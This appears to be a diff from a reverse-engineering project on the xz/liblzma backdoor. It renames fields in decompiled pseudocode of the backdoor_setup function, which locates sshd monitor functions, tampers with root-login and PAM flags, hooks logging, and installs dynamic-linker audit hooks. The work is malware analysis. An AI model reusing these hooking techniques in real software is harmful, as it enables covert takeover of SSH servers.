@@ -114,8 +114,8 @@ BOOL backdoor_setup(backdoor_setup_params_t *params)
   local_acc = 0;
   pbVar48 = &local_980;
   for (loop_idx = 0x256; loop_idx != 0; loop_idx = loop_idx + -1) {
-    *(undefined4 *)&pbVar48->main_map = 0;
-    pbVar48 = (backdoor_data_t *)((long)&pbVar48->main_map + 4);
+    *(undefined4 *)&pbVar48->sshd_link_map = 0;
+    pbVar48 = (backdoor_data_t *)((long)&pbVar48->sshd_link_map + 4);
   }
   elf_handles = &local_980.elf_handles;
   local_980.elf_handles.dynamic_linker = &local_980.dynamic_linker_info;
@@ -152,11 +152,11 @@ LAB_00105951:
       local_a88.dynamic_linker_ehdr = string_begin;
       BVar26 = main_elf_parse(&local_a88);
       if (BVar26 != FALSE) {
-        local_980.import_resolver = get_lzma_allocator();
+        local_980.active_lzma_allocator = get_lzma_allocator();
         loop_idx = 0;
         do {
-          *(undefined1 *)((long)&local_980.fake_allocator.alloc + loop_idx) =
-               *(undefined1 *)((long)&(local_980.import_resolver)->alloc + loop_idx);
+          *(undefined1 *)((long)&local_980.saved_lzma_allocator.alloc + loop_idx) =
+               *(undefined1 *)((long)&(local_980.active_lzma_allocator)->alloc + loop_idx);
           loop_idx = loop_idx + 1;
         } while (loop_idx != 0x18);
         local_a68.rsa_public_decrypt_slot = &local_ac0;
@@ -187,7 +187,7 @@ LAB_00105951:
         (local_b10->global_ctx).current_data_size = 0;
         (local_b10->global_ctx).payload_data = &pbVar51->signed_data;
         (local_b10->global_ctx).payload_data_size = signed_data_size;
-        elf_find_string_references(&local_980.main_info,&local_980.string_refs);
+        elf_find_string_references(&local_980.main_info,&local_980.sshd_string_refs);
         local_aa0 = 0;
         code_segment = elf_get_code_segment(local_980.elf_handles.liblzma,&local_aa0);
         if (code_segment != (void *)0x0) {
@@ -336,7 +336,7 @@ LAB_00105951:
           }
           BVar26 = sshd_find_sensitive_data
                              (local_980.elf_handles.main,local_980.elf_handles.libcrypto,
-                              &local_980.string_refs,imported_funcs,ctx);
+                              &local_980.sshd_string_refs,imported_funcs,ctx);
           if (BVar26 == FALSE) goto LAB_00105a60;
           if (bn_bin2bn_sym != (Elf64_Sym *)0x0) {
             libcrypto_sym_offset = bn_bin2bn_sym->st_value;
@@ -377,9 +377,9 @@ LAB_00105951:
           code_segment = elf_get_data_segment(local_980.elf_handles.main,(u64 *)&local_a30,FALSE);
           sshd_code_end_ptr = local_a30.instruction;
           if ((code_segment != (void *)0x0) &&
-             (local_980.string_refs.entries[0x12].func_start != (void *)0x0)) {
-            sshd_ctx_cursor->mm_request_send_start = local_980.string_refs.entries[0x12].func_start;
-            sshd_ctx_cursor->mm_request_send_end = local_980.string_refs.entries[0x12].func_end;
+             (local_980.sshd_string_refs.entries[0x12].func_start != (void *)0x0)) {
+            sshd_ctx_cursor->mm_request_send_start = local_980.sshd_string_refs.entries[0x12].func_start;
+            sshd_ctx_cursor->mm_request_send_end = local_980.sshd_string_refs.entries[0x12].func_end;
             local_a98 = CONCAT44(*(uint *)((u8 *)&local_a98 + 4),0x400);
             pcVar37 = elf_find_string(libcrypto_info,(EncodedStringId *)&local_a98,(void *)0x0);
             sshd_ctx_cursor->STR_without_password = pcVar37;
@@ -389,7 +389,7 @@ LAB_00105951:
                                     &sshd_ctx_cursor->mm_answer_authpassword_start,
                                     &sshd_ctx_cursor->mm_answer_authpassword_end,
                                     &sshd_ctx_cursor->mm_answer_authpassword_ptr,libcrypto_info,
-                                    &local_980.string_refs,ctx), BVar26 == FALSE)) {
+                                    &local_980.sshd_string_refs,ctx), BVar26 == FALSE)) {
               sshd_ctx_cursor->mm_answer_authpassword_start = (void *)0x0;
               sshd_ctx_cursor->mm_answer_authpassword_end = (void *)0x0;
               sshd_ctx_cursor->mm_answer_authpassword_ptr = (sshd_monitor_func_t *)0x0;
@@ -401,8 +401,8 @@ LAB_00105951:
               BVar26 = elf_find_function_pointer
                                  (XREF_mm_answer_keyallowed,&sshd_ctx_cursor->mm_answer_keyallowed_start,
                                   &sshd_ctx_cursor->mm_answer_keyallowed_end,
-                                  &sshd_ctx_cursor->mm_answer_keyallowed_ptr,libcrypto_info,&local_980.string_refs,
-                                  ctx);
+                                  &sshd_ctx_cursor->mm_answer_keyallowed_ptr,libcrypto_info,
+                                  &local_980.sshd_string_refs,ctx);
               if (BVar26 == FALSE) {
                 sshd_ctx_cursor->mm_answer_keyallowed_start = (sshd_monitor_func_t *)0x0;
                 sshd_ctx_cursor->mm_answer_keyallowed_end = (void *)0x0;
@@ -412,8 +412,8 @@ LAB_00105951:
                 BVar26 = elf_find_function_pointer
                                    (XREF_mm_answer_keyverify,&sshd_ctx_cursor->mm_answer_keyverify_start,
                                     &sshd_ctx_cursor->mm_answer_keyverify_end,
-                                    &sshd_ctx_cursor->mm_answer_keyverify_ptr,libcrypto_info,&local_980.string_refs
-                                    ,ctx);
+                                    &sshd_ctx_cursor->mm_answer_keyverify_ptr,libcrypto_info,
+                                    &local_980.sshd_string_refs,ctx);
                 if (BVar26 == FALSE) {
                   sshd_ctx_cursor->mm_answer_keyverify_start = (void *)0x0;
                   sshd_ctx_cursor->mm_answer_keyverify_end = (void *)0x0;
@@ -465,8 +465,8 @@ LAB_00105951:
                         sshd_ctx_cursor->have_mm_answer_keyverify = TRUE;
                       }
                       tls_slot = (int *)find_addr_referenced_in_mov_instruction
-                                                 (XREF_start_pam,&local_980.string_refs,code_segment,
-                                                  sshd_code_end_ptr + (long)code_segment);
+                                                 (XREF_start_pam,&local_980.sshd_string_refs,code_segment
+                                                  ,sshd_code_end_ptr + (long)code_segment);
                       if (tls_slot != (int *)0x0) {
                         ((local_b10->global_ctx).sshd_ctx)->use_pam_ptr = tls_slot;
                       }
@@ -516,7 +516,7 @@ LAB_00106471:
   ((local_b10->global_ctx).sshd_ctx)->auth_root_allowed_flag = 0;
 LAB_001064b8:
   tls_slot = (int *)find_addr_referenced_in_mov_instruction
-                             (XREF_auth_root_allowed,&local_980.string_refs,code_segment,
+                             (XREF_auth_root_allowed,&local_980.sshd_string_refs,code_segment,
                               sshd_code_end_ptr + (long)code_segment);
   if (tls_slot != (int *)0x0) {
     if ((((local_b10->global_ctx).sshd_ctx)->auth_root_allowed_flag != 0) &&
@@ -527,10 +527,10 @@ LAB_001064b8:
       local_9d8.instruction = (u8 *)0xf0000000e;
       hooks = (backdoor_hooks_data_t *)0x0;
       do {
-        sshd_code_end_ptr = (u8 *)local_980.string_refs.entries
+        sshd_code_end_ptr = (u8 *)local_980.sshd_string_refs.entries
                         [*(uint *)(local_9d8.opcode_window + loop_idx * 4 + -0x25)].func_start;
         if (sshd_code_end_ptr != (u8 *)0x0) {
-          payload_end = (u8 *)local_980.string_refs.entries
+          payload_end = (u8 *)local_980.sshd_string_refs.entries
                           [*(uint *)(local_9d8.opcode_window + loop_idx * 4 + -0x25)].func_end;
           search_hit_count = search_hit_count + 1;
           BVar26 = find_instruction_with_mem_operand(sshd_code_end_ptr,payload_end,(dasm_ctx_t *)0x0,tls_slot);
@@ -548,7 +548,7 @@ LAB_001064b8:
   }
 LAB_001065af:
   bn_dup_sym = elf_symbol_get(local_980.elf_handles.libcrypto,STR_EVP_DecryptFinal_ex,0);
-  BVar26 = sshd_find_monitor_struct(local_980.elf_handles.main,&local_980.string_refs,ctx);
+  BVar26 = sshd_find_monitor_struct(local_980.elf_handles.main,&local_980.sshd_string_refs,ctx);
   if (BVar26 == FALSE) {
     (local_b10->sshd_ctx).have_mm_answer_keyallowed = FALSE;
     (local_b10->sshd_ctx).have_mm_answer_keyverify = FALSE;
@@ -561,28 +561,28 @@ LAB_001065af:
   code_segment = elf_get_code_segment(&local_980.main_info,&local_a98);
   signed_data_size = local_a98;
   if ((((code_segment != (void *)0x0) && (0x10 < local_a98)) &&
-      ((u8 *)local_980.string_refs.entries[0x19].func_start != (u8 *)0x0)) &&
+      ((u8 *)local_980.sshd_string_refs.entries[0x19].func_start != (u8 *)0x0)) &&
      (((local_b10->global_ctx).uses_endbr64 == FALSE ||
       (BVar26 = is_endbr64_instruction
-                          ((u8 *)local_980.string_refs.entries[0x19].func_start,
-                           (u8 *)((long)local_980.string_refs.entries[0x19].func_start + 4),0xe230),
-      BVar26 != FALSE)))) {
-    sshd_log_ctx->sshlogv = local_980.string_refs.entries[0x19].func_start;
+                          ((u8 *)local_980.sshd_string_refs.entries[0x19].func_start,
+                           (u8 *)((long)local_980.sshd_string_refs.entries[0x19].func_start + 4),
+                           0xe230), BVar26 != FALSE)))) {
+    sshd_log_ctx->sshlogv = local_980.sshd_string_refs.entries[0x19].func_start;
     insn_ctx_cursor = &local_a30;
     for (loop_idx = 0x16; loop_idx != 0; loop_idx = loop_idx + -1) {
       *(undefined4 *)&insn_ctx_cursor->instruction = 0;
       insn_ctx_cursor = (dasm_ctx_t *)((long)insn_ctx_cursor + (ulong)zero_seed * -8 + 4);
     }
-    if ((u8 *)local_980.string_refs.entries[0x1a].func_start != (u8 *)0x0) {
-      local_b48 = (u8 *)local_980.string_refs.entries[0x1a].func_start;
+    if ((u8 *)local_980.sshd_string_refs.entries[0x1a].func_start != (u8 *)0x0) {
+      local_b48 = (u8 *)local_980.sshd_string_refs.entries[0x1a].func_start;
       local_b20 = (u8 *)0x0;
       sshd_code_end_ptr = (u8 *)0x0;
       do {
         while( TRUE ) {
-          if ((local_980.string_refs.entries[0x1a].func_end <= local_b48) ||
+          if ((local_980.sshd_string_refs.entries[0x1a].func_end <= local_b48) ||
              ((local_b20 != (u8 *)0x0 && (sshd_code_end_ptr != (u8 *)0x0)))) goto LAB_00106bf0;
-          BVar26 = x86_dasm(&local_a30,local_b48,(u8 *)local_980.string_refs.entries[0x1a].func_end)
-          ;
+          BVar26 = x86_dasm(&local_a30,local_b48,
+                            (u8 *)local_980.sshd_string_refs.entries[0x1a].func_end);
           if (BVar26 != FALSE) break;
           local_b48 = local_b48 + 1;
         }
@@ -629,12 +629,12 @@ LAB_001067fb:
           }
           payload_end = (u8 *)0x0;
           lzma_code_end = local_b48;
-          for (; (lzma_code_end < local_980.string_refs.entries[0x1a].func_end && (log_string_slot < 5));
+          for (; (lzma_code_end < local_980.sshd_string_refs.entries[0x1a].func_end && (log_string_slot < 5));
               log_string_slot = log_string_slot + 1) {
             if ((payload_end != (u8 *)0x0) && (sshd_code_end_ptr != (u8 *)0x0)) goto LAB_00106b3c;
             BVar26 = find_mov_instruction
-                               (lzma_code_end,(u8 *)local_980.string_refs.entries[0x1a].func_end,TRUE,
-                                FALSE,&local_9d8);
+                               (lzma_code_end,(u8 *)local_980.sshd_string_refs.entries[0x1a].func_end,TRUE
+                                ,FALSE,&local_9d8);
             if (BVar26 == FALSE) break;
             if ((local_9d8.prefix.flags_u16 & 0x1040) != 0) {
               if ((local_9d8.prefix.flags_u16 & 0x40) == 0) {
@@ -689,7 +689,7 @@ LAB_00106ab1:
 LAB_00106b3c:
             BVar26 = validate_log_handler_pointers
                                (payload_end,sshd_code_end_ptr,code_segment,(u8 *)((long)code_segment + signed_data_size),
-                                &local_980.string_refs,ctx);
+                                &local_980.sshd_string_refs,ctx);
             local_b20 = payload_end;
             if (BVar26 != FALSE) {
               sshd_log_ctx->log_handler_ptr = payload_end;
@@ -744,7 +744,7 @@ LAB_00106b3c:
             }
             do {
               BVar26 = find_instruction_with_mem_operand_ex
-                                 (sshd_code_end_ptr,(u8 *)local_980.string_refs.entries[0x1a].func_end,
+                                 (sshd_code_end_ptr,(u8 *)local_980.sshd_string_refs.entries[0x1a].func_end,
                                   &local_9d8,0x147,(void *)0x0);
               if (BVar26 == FALSE) break;
               if ((local_9d8.imm_zeroextended == 0) && ((local_9d8.prefix.flags_u16 & 0x100) != 0))
@@ -766,7 +766,7 @@ LAB_00106b3c:
             } while (local_9d8.instruction +
                      CONCAT44(*(uint *)((u8 *)&local_9d8.instruction_size + 4),
                               (undefined4)local_9d8.instruction_size) <
-                     local_980.string_refs.entries[0x1a].func_end);
+                     local_980.sshd_string_refs.entries[0x1a].func_end);
             goto LAB_00106ab1;
           }
         }
@@ -827,19 +827,19 @@ LAB_00106bf0:
                                 (u8 *)peVar34->elf_parse), BVar26 != FALSE)) &&
           ((local_b10->global_ctx).num_shifted_bits == 0x1c8)))))) {
     *(local_b10->ldso_ctx).libcrypto_l_name = (char *)local_b10;
-    local_980.main_map = local_980.main_map + local_ac8 + 8;
-    resolver_status = *(u32 *)local_980.main_map;
-    (local_b10->ldso_ctx).sshd_auditstate_bindflags_ptr = (u32 *)local_980.main_map;
+    local_980.sshd_link_map = local_980.sshd_link_map + local_ac8 + 8;
+    resolver_status = *(u32 *)local_980.sshd_link_map;
+    (local_b10->ldso_ctx).sshd_auditstate_bindflags_ptr = (u32 *)local_980.sshd_link_map;
     (local_b10->ldso_ctx).sshd_auditstate_bindflags_old_value = resolver_status;
-    *(u32 *)local_980.main_map = 2;
+    *(u32 *)local_980.sshd_link_map = 2;
     hook_table_bytes = (byte *)(local_b10->ldso_ctx).sshd_link_map_l_audit_any_plt_addr;
     *hook_table_bytes = *hook_table_bytes | (local_b10->ldso_ctx).link_map_l_audit_any_plt_bitmask;
-    local_980.libcrypto_map = local_980.libcrypto_map + local_ac8 + 8;
-    resolver_status = *(u32 *)local_980.libcrypto_map;
-    (local_b10->ldso_ctx).libcrypto_auditstate_bindflags_ptr = (u32 *)local_980.libcrypto_map;
+    local_980.libcrypto_link_map = local_980.libcrypto_link_map + local_ac8 + 8;
+    resolver_status = *(u32 *)local_980.libcrypto_link_map;
+    (local_b10->ldso_ctx).libcrypto_auditstate_bindflags_ptr = (u32 *)local_980.libcrypto_link_map;
     (local_b10->ldso_ctx).libcrypto_auditstate_bindflags_old_value = resolver_status;
     audit_ifaces_ptr = &(local_b10->ldso_ctx).hooked_audit_ifaces;
-    *(u32 *)local_980.libcrypto_map = 1;
+    *(u32 *)local_980.libcrypto_link_map = 1;
     paVar57 = audit_ifaces_ptr;
     for (loop_idx = 0x1e; loop_idx != 0; loop_idx = loop_idx + -1) {
       *(undefined4 *)&paVar57->activity = 0;
@@ -850,22 +850,22 @@ LAB_00106bf0:
     *(local_b10->ldso_ctx)._dl_audit_ptr = audit_ifaces_ptr;
     *(local_b10->ldso_ctx)._dl_naudit_ptr = 1;
     loop_idx = 0;
-    libc_allocator = local_980.import_resolver;
+    libc_allocator = local_980.active_lzma_allocator;
     while (libc_allocator != (lzma_allocator *)0x0) {
-      *(undefined1 *)((long)&(local_980.import_resolver)->alloc + loop_idx) =
-           *(undefined1 *)((long)&local_980.fake_allocator.alloc + loop_idx);
+      *(undefined1 *)((long)&(local_980.active_lzma_allocator)->alloc + loop_idx) =
+           *(undefined1 *)((long)&local_980.saved_lzma_allocator.alloc + loop_idx);
       libc_allocator = (lzma_allocator *)(loop_idx + -0x17);
       loop_idx = loop_idx + 1;
     }
     goto LAB_00105a81;
   }
 LAB_00105a60:
-  libc_allocator = &local_980.fake_allocator;
+  libc_allocator = &local_980.saved_lzma_allocator;
   init_ldso_ctx(&local_b10->ldso_ctx);
   loop_idx = 0;
-  libcrypto_allocator = local_980.import_resolver;
+  libcrypto_allocator = local_980.active_lzma_allocator;
   while (libcrypto_allocator != (lzma_allocator *)0x0) {
-    *(undefined1 *)((long)&(local_980.import_resolver)->alloc + loop_idx) =
+    *(undefined1 *)((long)&(local_980.active_lzma_allocator)->alloc + loop_idx) =
          *(undefined1 *)((long)&libc_allocator->alloc + loop_idx);
     libcrypto_allocator = (lzma_allocator *)(loop_idx + -0x17);
     loop_idx = loop_idx + 1;
